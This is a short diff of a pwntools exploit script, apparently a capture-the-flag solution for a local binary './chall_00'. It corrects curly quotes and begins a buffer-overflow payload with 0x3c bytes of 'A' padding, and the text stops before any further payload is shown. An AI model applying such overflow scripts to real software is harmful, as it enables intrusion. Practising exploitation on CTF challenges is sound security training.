@@ -1,6 +1,6 @@
 from pwn import *
 
-p = process (“./chall_00”)
+p = process ("./chall_00")
 p.recv()
 payload = b'' 
 payload+= (0x40-0x4) * b'A'
